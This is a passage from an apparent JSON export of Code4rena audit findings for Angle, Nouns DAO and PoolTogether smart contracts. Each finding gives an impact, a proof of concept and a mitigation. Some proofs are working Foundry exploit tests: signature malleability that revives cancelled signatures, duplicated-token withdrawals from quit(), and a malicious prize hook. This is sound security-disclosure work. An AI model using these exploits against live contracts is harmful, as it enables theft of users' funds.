period](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L161) and the next accrual may [slash more vested yield](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L130-L141).   Thus, users can lose a portion of the yield that was earned at a lower protocol fee after the fee was increased. Likewise, increasing the vesting period may result in slashing yield that was earned before the period was increased. ## Tools Used Manual review ## Recommended Mitigation Steps In the `SavingsVest.setParams` function, consider accruing interest with the current parameters before setting new `protocolSafetyFee` and `vestingPeriod`.   ## Assessed type  Other"}, {"title": "Poor detection of disputed trees allows claiming tokens from a disputed tree", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/10", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/merkl-contracts/blob/1825925daef8b22d9d6c0a2bc7aab3309342e786/contracts/Distributor.sol#L200   # Vulnerability details  ## Targets https://github.com/AngleProtocol/merkl-contracts/blob/1825925daef8b22d9d6c0a2bc7aab3309342e786/contracts/Distributor.sol#L200 ## Impact Users can claim rewards from a Merkle tree that's being disputed. This can potentially lead to loss of funds since a malicious trusted EOA can claim funds from a malicious tree while it's being disputed. ## Proof of Concept The [Distribution.getMerkleRoot](https://github.com/AngleProtocol/merkl-contracts/blob/1825925daef8b22d9d6c0a2bc7aab3309342e786/contracts/Distributor.sol#L199) function is used to get the current Merkle root during claiming. The function is aware of the dispute period of the current root and returns the previous root if the current tree is still in the dispute period.  However, the function doesn't take into account the situation when: 1. a tree was disputed (i.e. [the disputer address is set](https://github.com/AngleProtocol/merkl-contracts/blob/1825925daef8b22d9d6c0a2bc7aab3309342e786/contracts/Distributor.sol#L237)); 1. and the dispute period has finished (i.e. when `block.timestamp >= endOfDisputePeriod`).  Such situations can happen realistically when a tree is disputed closer to the end of its dispute period and/or when the governor/guardian takes longer time to resolve the dispute. In such situations, the dispute period checks in the above functions will pass, however the `disputer` address will be set, which means that the tree is being disputed and shouldn't be used in claims.  As an example exploit scenario, a malicious trusted EOA can add a Merkle tree root that lets them claim the entire balance of the contract. Even if the tree gets disputed quickly, the success of the attack boils down to how quickly the governor/guardian will resolve the dispute. To increase the chance, the attack can be deliberately executed when the governor/guardian are not active or available immediately. ## Tools Used Manual review ## Recommended Mitigation Steps When the `disputer` address is set (after a call to `disputeTree`), consider treating the current tree as disputed, no matter whether the dispute period has passed or not. E.g. consider these changes: ```diff diff --git a/contracts/Distributor.sol b/contracts/Distributor.sol index bc4e49f..8fb6a4c 100644 --- a/contracts/Distributor.sol +++ b/contracts/Distributor.sol @@ -197,7 +197,7 @@ contract Distributor is UUPSHelper {       /// @notice Returns the MerkleRoot that is currently live for the contract      function getMerkleRoot() public view returns (bytes32) { -        if (block.timestamp >= endOfDisputePeriod) return tree.merkleRoot; +        if (block.timestamp >= endOfDisputePeriod && disputer == address(0)) return tree.merkleRoot;          else return lastTree.merkleRoot;      }  ```   ## Assessed type  Other"}, {"title": "User may get less tokens than expected when collateral list order changes", "html_url": "https://github.com/code-423n4/2023-06-angle-findings/issues/8", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-06-angle-findings", "body": "# Lines of code  https://github.com/AngleProtocol/angle-transmuter/blob/8a2c3aaf4bd054581b06d33049370a6f01b56d44/contracts/transmuter/libraries/LibSetters.sol#L123 https://github.com/AngleProtocol/angle-transmuter/blob/8a2c3aaf4bd054581b06d33049370a6f01b56d44/contracts/transmuter/facets/Redeemer.sol#L64   # Vulnerability details  ## Impact The order of `ts.collateralList` is not stable: Whenever `LibSetters.revokeCollateral` is used to revoke a collateral, it may change because of the swap that is performed. However, the function `Redeemer.redeem` relies on this order, as the user has to provide the `minAmountsOut` in the order of `ts.collateralList`. This can lead to situations where the user has crafted the `minAmountsOut` array when the order was still different, leading to unintended results (and potentially redemptions that the user did not want to accept). It also means that revoking a collateral can be challenging for the team / governance because it should never be done when a user has already prepared a redemption (either via the frontend which he had open or some other way to interact with the contract). But there is of course no way to know this.  ## Proof of Concept Let's say the system contains the collateral [tokenA, tokenB, tokenC]. `normalizedStables` for tokenA is 0. The user therefore does not want to receive tokenA (and will not receive anything for it). However, it is extremely important to him that he receives 100,000 of tokenC. He therefore crafts a `minAmountsOut` of [0, 10000, 100000]. Just before he submits the call, tokenA is removed from the system, resulting in the collateral array [tokenC, tokenB]. Even if the user only receives 50,000 tokens of tokenC, the call will therefore succeed.  ## Recommended Mitigation Steps The problem could be alleviated a bit by checking the length of `minAmountsOut` (making sure it is not longer than `ts.collateralList`). However, that would not help if a collateral is revoked and a new one is added. Another solution would be to provide pairs of token addresses and amounts, which would solve the problem completely.   ## Assessed type  Other"}, {"title": "cancelSig will not completely cancel signatures due to malleability vulnerabilities", "html_url": "https://github.com/code-423n4/2023-07-nounsdao-findings/issues/198", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "grade-b", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-07-nounsdao-findings", "body": "# Lines of code  https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L270-L275 https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Proposals.sol#L983   # Vulnerability details  ## Impact  The current version of openzeppelin contracts has a high risk of vulnerability about signature malleability attack: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610. So if the signer only cancel one signature, the malicious proposer can still extend a fully valid signature through the previous signature to pass the proposal.  ## Proof of Concept  ```solidity // CancelProposalBySigs.t.sol contract TestSignatureMalleabilityAttack is ZeroState {     function setUp() public virtual override {         super.setUp();          (signerWithVote, signerWithVotePK) = makeAddrAndKey('signerWithVote');          vm.startPrank(minter);         nounsToken.mint();         nounsToken.transferFrom(minter, signerWithVote, 1);         vm.roll(block.number + 1);         vm.stopPrank();          NounsDAOV3Proposals.ProposalTxs memory txs = makeTxs(makeAddr('target'), 0, '', '');         uint256 expirationTimestamp = block.timestamp + 1234;         NounsDAOStorageV3.ProposerSignature[] memory proposerSignatures = new NounsDAOStorageV3.ProposerSignature[](1);         bytes memory signature = signProposal(proposer, signerWithVotePK, txs, 'description', expirationTimestamp, address(dao));         vm.prank(signerWithVote);         dao.cancelSig(signature);          proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(             signature,             signerWithVote,             expirationTimestamp         );         vm.expectRevert(abi.encodeWithSelector(NounsDAOV3Proposals.SignatureIsCancelled.selector));         vm.prank(proposer);         proposalId = dao.proposeBySigs(             proposerSignatures,             txs.targets,             txs.values,             txs.signatures,             txs.calldatas,             'description'         );          proposerSignatures[0] = NounsDAOStorageV3.ProposerSignature(             to2098Format(signature),             signerWithVote,             expirationTimestamp         );         vm.prank(proposer);         proposalId = dao.proposeBySigs(             proposerSignatures,             txs.targets,             txs.values,             txs.signatures,             txs.calldatas,             'description'         );          vm.roll(block.number + 1);          assertEq(uint256(dao.state(proposalId)), uint256(NounsDAOStorageV3.ProposalState.Updatable));     }      // Copy from https://github.com/pcaversaccio/malleable-signatures/blob/1f618f556c0af48c44d27c7dbf1f97dc898ceda9/test/SignatureMalleability.t.sol#L78     error InvalidSignatureLength();     error InvalidSignatureSValue();     function to2098Format(bytes memory signature) internal view returns (bytes memory) {         if (signature.length != 65) revert InvalidSignatureLength();         if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue();         bytes memory short = slice(signature, 0, 64);         uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);         short[32] = bytes1(parityBit);         return short;     }      // Copy from https://github.com/GNSPS/solidity-bytes-utils/blob/6458fb2780a3092bc756e737f246be1de6d3d362/contracts/BytesLib.sol#L228     function slice(         bytes memory _bytes,         uint256 _start,         uint256 _length     )         internal         pure         returns (bytes memory)     {         require(_length + 31 >= _length, \"slice_overflow\");         require(_bytes.length >= _start + _length, \"slice_outOfBounds\");          bytes memory tempBytes;          assembly {             switch iszero(_length)             case 0 {                 // Get a location of some free memory and store it in tempBytes as                 // Solidity does for memory variables.                 tempBytes := mload(0x40)                  // The first word of the slice result is potentially a partial                 // word read from the original array. To read it, we calculate                 // the length of that partial word and start copying that many                 // bytes into the array. The first word we copy will start with                 // data we don't care about, but the last `lengthmod` bytes will                 // land at the beginning of the contents of the new array. When                 // we're done copying, we overwrite the full first word with                 // the actual length of the slice.                 let lengthmod := and(_length, 31)                  // The multiplication in the next line is necessary                 // because when slicing multiples of 32 bytes (lengthmod == 0)                 // the following copy loop was copying the origin's length                 // and then ending prematurely not copying everything it should.                 let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))                 let end := add(mc, _length)                  for {                     // The multiplication in the next line has the same exact purpose                     // as the one above.                     let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)                 } lt(mc, end) {                     mc := add(mc, 0x20)                     cc := add(cc, 0x20)                 } {                     mstore(mc, mload(cc))                 }                  mstore(tempBytes, _length)                  //update free-memory pointer                 //allocating the array padded to 32 bytes like the compiler does now                 mstore(0x40, and(add(mc, 31), not(31)))             }             //if we want a zero-length slice let's just return a zero-length array             default {                 tempBytes := mload(0x40)                 //zero out the 32 bytes slice we are about to return                 //we need to do it because Solidity does not garbage collect                 mstore(tempBytes, 0)                  mstore(0x40, add(tempBytes, 0x20))             }         }          return tempBytes;     }      function testAttack() public {} } ```  ```shell forge test --match-test testAttack -vvvv --ffi ```  ## Tools Used  Foundry  ## Recommended Mitigation Steps  Update openzeppelin contracts to the new version   ## Assessed type  Library"}, {"title": "User can steal tokens by using duplicated ERC20 tokens as parameter in NounsDAOLogicV1Fork.quit", "html_url": "https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-01"], "target": "2023-07-nounsdao-findings", "body": "# Lines of code  https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216   # Vulnerability details  ## Impact Calling [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216) by using dupliated ERC20 tokens, malicious user can gain more ERC20 tokens than he/she is supposed to, even drain all ERC20 tokens  ## Proof of Concept In function, [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216), `erc20TokensToInclude` is used to specified tokens a user wants to get, but since the function doesn't verify if `erc20TokensToInclude` contains dupliated tokens, it's possible that a malicious user calls the function by specify the ERC20 more than once to get more share tokens ```solidity     function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {             if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {                 revert TokensMustBeASubsetOfWhitelistedTokens();             }         }          quitInternal(tokenIds, erc20TokensToInclude);     }      function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {         checkGovernanceActive();          uint256 totalSupply = adjustedTotalSupply();          for (uint256 i = 0; i < tokenIds.length; i++) {             nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);         }          uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);          // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.         uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {             IERC20 erc20token = IERC20(erc20TokensToInclude[i]);             balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;         }          // Send ETH and ERC20 tokens         timelock.sendETH(payable(msg.sender), ethToSend);         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {             if (balancesToSend[i] > 0) {                 timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);             }         }          emit Quit(msg.sender, tokenIds);     } ```  Add the following code in test/foundry/governance/fork/NounsDAOLogicV1Fork.t.sol file `NounsDAOLogicV1Fork_Quit_Test` contract, and run `forge test --ffi --mt test_quit_allowsChoosingErc20TokensToIncludeTwice` ```solidity     function test_quit_allowsChoosingErc20TokensToIncludeTwice() public {         vm.prank(quitter);         address[] memory tokensToInclude = new address[](3);         //****************************         // specify token2 three times         //****************************         tokensToInclude[0] = address(token2);         tokensToInclude[1] = address(token2);         tokensToInclude[2] = address(token2);         dao.quit(quitterTokens, tokensToInclude);          assertEq(quitter.balance, 24 ether);         assertEq(token1.balanceOf(quitter), 0);         //****************************         // get 3 time tokens         //****************************         assertEq(token2.balanceOf(quitter), 3 * (TOKEN2_BALANCE * 2) / 10);      } ```  ## Tools Used VS  ## Recommended Mitigation Steps By using function `checkForDuplicates` to prevent the issue ```diff --- NounsDAOLogicV1Fork.sol 2023-07-12 21:32:56.925848531 +0800 +++ NounsDAOLogicV1ForkNew.sol 2023-07-12 21:32:34.006158294 +0800 @@ -203,8 +203,9 @@          quitInternal(tokenIds, erc20TokensToIncludeInQuit);      }   -    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant { +    function quit(uint256[] calldata tokenIds, address[] memory erc20tokenstoinclude) external nonReentrant {          // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit` +        checkForDuplicates(erc20tokenstoinclude);          address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;          for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {              if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {  ```   ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/471", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-01"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/peanuts-Analysis.md)."}, {"title": "IF THE UNDERLYING ASSET IS A FEE ON TRANSFER TOKEN IT COULD BREAK THE INTERNAL ACCOUNTING OF THE VAULT", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/470", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L951-L956 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L959 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1026-L1027   # Vulnerability details  ## Impact The `Vault._deposit` function is used by the users to deposit `_assets` to the vault and mint vault shares to the `recipient` address. The amount of `_assets` are transferred to the `Vault` as follows:        SafeERC20.safeTransferFrom(         _asset,         _caller,         address(this),         _assetsDeposit != 0 ? _assetsDeposit : _assets       );  The `Vault.deposit` function uses this `_assets` amount to calculate the number of `shares` to be minted to the `_recipient` address.  The issue here is if the underlying `_asset` is a fee on transfer token then the actual received amount to the vault will be less than what is referred in the `Vault.deposit` function `_assets` input parameter. But the shares to mint is calculated using the entire `_assets` amount.  This issue could be further aggravated since the `_asset` is again `deposited` to the `_yieldVault` and when needing to be redeemed will be `withdrawn` from the `_yieldVault` as well. These operations will again charge a fee if the `_asset` is a fee on transfer token. Hence the actual left `_asset` amount for particular user will be less than the amount he initially transferred in.  Hence when the user `redeems` the minted shares back to the `_assets`, the contract will not have enough assets to transfer to the `redeemer` thus reverting the transaction.   ## Proof of Concept  ```solidity       SafeERC20.safeTransferFrom(         _asset,         _caller,         address(this),         _assetsDeposit != 0 ? _assetsDeposit : _assets       ); ```  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L951-L956  ```solidity     _yieldVault.deposit(_assets, address(this)); ```  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L959  ```solidity     _yieldVault.withdraw(_assets, address(this), address(this));     SafeERC20.safeTransfer(IERC20(asset()), _receiver, _assets); ```  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1026-L1027  ## Tools Used Manual Review and VSCode  ## Recommended Mitigation Steps  Hence it is recommended to compute the `_assets` amount balance of the contract before and after the `safeTransferFrom` call and get the difference between the two as the actually transferred amount to the `Vault`. Then this actually transferred amount can be converted to shares and mint the correct amount of shares to the `recipient`.  ```solidity   uint256 balanceBefore = _asset.balanceOf(address(this));        SafeERC20.safeTransferFrom(         _asset,         _caller,         address(this),         _assetsDeposit != 0 ? _assetsDeposit : _assets       );    uint256 balanceAfter = _asset.balanceOf(address(this));      uint256 transferredAmount = balanceAfter - balanceBefore; ```   ## Assessed type  Other"}, {"title": "Unintended or Malicious Use of Prize Winners' Hooks", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/465", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L653 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1053 https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1068   # Vulnerability details  ## Impact The setHooks function in Vault.sol allows users to set arbitrary hooks, potentially enabling them to make external calls with unintended consequences. This vulnerability could lead to various unexpected behaviors, such as unauthorized side transactions with gas paid unbeknownst to the claimer, reentrant calls, or denial-of-service attacks on claiming transactions.  [Vault.sol#L653](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L653) ```solidity function setHooks(VaultHooks memory hooks) external {     _hooks[msg.sender] = hooks;       emit SetHooks(msg.sender, hooks);   } ```  ## Proof of Concept Consider the following side contract and malicious hook implementation:  Side Contract: ```solidity // SPDX-License_Identifier: MIT pragma solidity 0.8.17;  import \"forge-std/console.sol\";  contract SideContract {   uint256 public codex;    function execute() external {     codex = 1;     console.log(\"Entered side contract\");   } } ```  Malicious Hook: ```solidity // SPDX-License_Identifier: MIT pragma solidity 0.8.17;  import { SideContract } from \"./SideContract.sol\";  contract ViciousHook {   SideContract public sideContract = new SideContract();    function beforeClaimPrize(     address winner,     uint8 tier,     uint32 prizeIndex   ) external returns (address) {     sideContract.execute();      return address(this);   } } ```  Modified Test File: ```diff diff --git a/test/unit/Vault/Vault.t.sol b/test/unit/Vault/Vault.t.sol index d0d6d30..65caca1 100644 --- a/test/unit/Vault/Vault.t.sol +++ b/test/unit/Vault/Vault.t.sol @@ -4,6 +4,7 @@ pragma solidity 0.8.17;  import { UnitBaseSetup, LiquidationPair, PrizePool, TwabController, VaultMock, ERC20, IERC20, IERC4626 } from \"test/utils/UnitBaseSetup.t.sol\";  import { IVaultHooks, VaultHooks } from \"../../../src/interfaces/IVaultHooks.sol\";  import \"src/Vault.sol\"; +import { ViciousHook } from \"./ViciousHook.sol\";    contract VaultTest is UnitBaseSetup {    /* ============ Events ============ */ @@ -174,6 +175,25 @@ contract VaultTest is UnitBaseSetup {      vm.stopPrank();    }   +  function testClaimPrize_viciousHook() public { +    ViciousHook viciousHook = new ViciousHook(); +    vm.startPrank(alice); +    VaultHooks memory hooks = VaultHooks({ +      useBeforeClaimPrize: true, +      useAfterClaimPrize: false, +      implementation: IVaultHooks(address(viciousHook)) +    }); +    vault.setHooks(hooks); +    vm.stopPrank(); + +    vm.startPrank(address(claimer)); + +    mockPrizePoolClaimPrize(uint8(1), alice, 0, address(viciousHook), 1e18, address(claimer)); +    claimPrize(uint8(1), alice, 0, 1e18, address(claimer)); + +    vm.stopPrank(); +  } +    function testClaimPrize_beforeHook() public {      vm.startPrank(alice);      VaultHooks memory hooks = VaultHooks({ ``` When running the test with `forge test --match-test testClaimPrize_viciousHook -vv ` the output is: ```bash Running 1 test for test/unit/Vault/Vault.t.sol:VaultTest [PASS] testClaimPrize_viciousHook() (gas: 321545) Logs:   Entered side contract  Test result: ok. 1 passed; 0 failed; finished in 7.29ms ``` This indicates that it is possible for a hook to make an external call and modify the EVM state. With that fact, attack vectors are multiple.  ## Tools Used Foundry  ## Recommended Mitigation Steps To prevent any malicious calls there are two possible solutions: - Change the `IVaultHook.sol` to set the hooks as view functions and prevent EVM state changes: ```diff diff --git a/src/interfaces/IVaultHooks.sol b/src/interfaces/IVaultHooks.sol index 15217b8..95482c1 100644 --- a/src/interfaces/IVaultHooks.sol +++ b/src/interfaces/IVaultHooks.sol @@ -23,7 +23,7 @@ interface IVaultHooks {      address winner,      uint8 tier,      uint32 prizeIndex -  ) external returns (address); +  ) external view returns (address);      /// @notice Triggered after the prize pool claim prize function is called.    /// @param winner The user who won the prize and for whom this hook is attached @@ -37,5 +37,5 @@ interface IVaultHooks {      uint32 prizeIndex,      uint256 payout,      address recipient -  ) external; +  ) external view;  }  ``` - As this solution may disturb the business logic, another solution would be to cap the gas used by the hooks. In `Vault.sol`, set a gas limit variable that can be adjusted by the owner of the vault for flexibility: [Vault.sol#L1053](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1053) [Vault.sol#L1068](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1068) ```solidity   function _claimPrize(     address _winner,     uint8 _tier,     uint32 _prizeIndex,     uint96 _fee,     address _feeRecipient   ) internal returns (uint256) {     VaultHooks memory hooks = _hooks[_winner];     address recipient;     if (hooks.useBeforeClaimPrize) {       recipient = hooks.implementation.beforeClaimPrize{gas: gasLimit}(_winner, _tier, _prizeIndex); @audit-info     } else {       recipient = _winner;     } ...  if (hooks.useAfterClaimPrize) {       hooks.implementation.afterClaimPrize{gas: gasLimit}( //@audit-info         _winner,         _tier,         _prizeIndex,         prizeTotal - _fee,         recipient       );     }      return prizeTotal;   }  ```    ## Assessed type  Other"}, {"title": "`TwabLib::getTwabBetween` can return innacurate balances if `_startTime` and `_endTime` aren't safely bounded", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/464", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L920, https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/libraries/TwabLib.sol#L281, https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L429   # Vulnerability details  ## M-01 `TwabLib::getTwabBetween` can return innacurate balances if `_startTime` and `_endTime` aren't safely bounded  ## Vulnerability details Here's the documentation of the get `TwabLib::getTwabBetween` function :  ```solidity File: twab-controller\\src\\libraries\\TwabLib.sol  278:   /** 279:    * @notice Looks up a users TWAB for a time range. 280:    * @dev If the timestamps in the range are not exact matches of observations, the balance is extrapolated using the previous observation. 281:    * @dev Ensure timestamps are safe using isTimeRangeSafe. 282:    * @param _observations The circular buffer of observations 283:    * @param _accountDetails The account details to query with 284:    * @param _startTime The start of the time range 285:    * @param _endTime The end of the time range 286:    * @return twab The TWAB for the time range 287:    */ 288:   function getTwabBetween(  //@audit - M01: dev comment (isTimeRangeSafe) doesn't seems to be followed in PrizePool calling it 289:     uint32 PERIOD_OFFSET, 290:     ObservationLib.Observation[MAX_CARDINALITY] storage _observations, 291:     AccountDetails memory _accountDetails, 292:     uint32 _startTime, 293:     uint32 _endTime 294:   ) internal view returns (uint256) { ```  `TwabLib::getTwabBetween` function get called in `PrizePool::_getVaultUserBalanceAndTotalSupplyTwab`, which itself get called by `PrizePool::claimPrize` returning twab for a specified time-range, which finally is called by `PrizePool::isWinner` in `PrizePool::claimPrize`.  The thing is, as well explained by [the documentation](https://v4.docs.pooltogether.com/protocol/next/design/twab-controller/#sample-loss-of-historic-information), values from balance history isn't guaranteed to be accurate the if timestamp at which it is queried time do not fall between : - (or at) the newest observation in a period - and the end of that period (period must have ended)  That is because, until a period has ended we cannot be sure the value we are querying haven't changed in the future (from pov of the timestamp)   ### Impact  This means that if a prize is claimed, but timestamps at which the twab is getting requested do not follow these rules, the Prize Pool contract might distribute prizes based on inaccurate data. This could lead to prizes being distributed to users who should not have won, or not being distributed to users who should have won.  ```solidity File: prize-pool\\src\\PrizePool.sol  920:   function _getVaultUserBalanceAndTotalSupplyTwab( 921:     address _vault, 922:     address _user, 923:     uint256 _drawDuration 924:   ) internal view returns (uint256 twab, uint256 twabTotalSupply) { 925:     uint32 _endTimestamp = uint32(_lastClosedDrawStartedAt + drawPeriodSeconds); 926:     uint32 _startTimestamp = uint32(_endTimestamp - _drawDuration * drawPeriodSeconds); 927:     //@audit - dev comment for TwabLib::getTwabBetween doesn't seems to be followed in PrizePool calling it 928:     twab = twabController.getTwabBetween(_vault, _user, _startTimestamp, _endTimestamp); 929:  930:     twabTotalSupply = twabController.getTotalSupplyTwabBetween( 931:       _vault, 932:       _startTimestamp, 933:       _endTimestamp 934:     ); 935:   } ```  ### Tools Used Manual audit  ### Recommended Mitigation Steps  Add `isTimeRangeSafe` check (will depend on how devs want to handle it, either a revert or another error management solution) before `getTwabBetween` to ensure queried balances are acurate, otherwise, prize distibution could be unfair  ```solidity   function _getVaultUserBalanceAndTotalSupplyTwab(     address _vault,     address _user,     uint256 _drawDuration   ) internal view returns (uint256 twab, uint256 twabTotalSupply) {     uint32 _endTimestamp = uint32(_lastClosedDrawStartedAt + drawPeriodSeconds);     uint32 _startTimestamp = uint32(_endTimestamp - _drawDuration * drawPeriodSeconds);     //@audit dev comment doesn't seems to be followed in PrizePool calling it     //@audit added isTimeRangeSafe before getTwabBetween     require(twabController.isTimeRangeSafe(_vault, _user, _startTimestamp, _endTimestamp), \"Time range not safe\");     twab = twabController.getTwabBetween(_vault, _user, _startTimestamp, _endTimestamp);      twabTotalSupply = twabController.getTotalSupplyTwabBetween(       _vault,       _startTimestamp,       _endTimestamp     );   } ```   ## Assessed type  Invalid Validation"}, {"title": "deposit function does not check for the `maxMint` amount.", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/458", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L407-L415   # Vulnerability details  ## Impact It is theoretically possible for the deposit amount to mint shares more than the `maxMint` amount  ## Proof of Concept The deposit function has a check for `maxDeposit` and reverts if the deposit value is more than max(uint96). But, it does not check the shares to be less than `maxMint` amount and hence bypasses this check. Theoretically, if the assets are equal to max(uint96) and if the vault is under-collateralised, the ratio of `_assetUnit` to `_exchangeRate` is greater than or equal to 2, then the calculation in `_convertToShares`:   `_assets.mulDiv(_assetUnit, _exchangeRate, _rounding);` could return a value more than the `maxMint` amount. This is possible in those scenarios where the `_assetUnit` is a big enough number (possible, as there is no limit on the decimals of the underlying asset, and `_assetUnit = 10 ** super.decimals()`) and the Vault is severely under-collateralized.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Include the maxMint check in the deposit function to prevent this problem.   ## Assessed type  Invalid Validation"}, {"title": "Balance invariant between individual and total twabs can be broken", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/452", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L554-L570   # Vulnerability details  ## Impact  An edge case in the `TwabController._transferBalance` can cause total balance for a vault account to decrease although it did not actually decrease. This will cause the sum of individual delegateBalances for a vault to be greater than the registered total for that vault. This again will skew the odds in favor of winning a price, causing the reserve to be drained faster over time than intended.  ## Proof of Concept  The `TwabController._transferBalance` function handles the case incorrectly where `_to` is equal to the `SPONSORSHIP_ADDRESS`. First, assume the `_from` address is an address that has a balance and delegates to itself (the default). Then the function will decrease the balance and delegateBalance of `_from`. It will also decrease the total balances of the vault account (note that `_toDelegate` will be `SPONSORSHIP_ADDRESS` due to default):  ```js     if (_from != 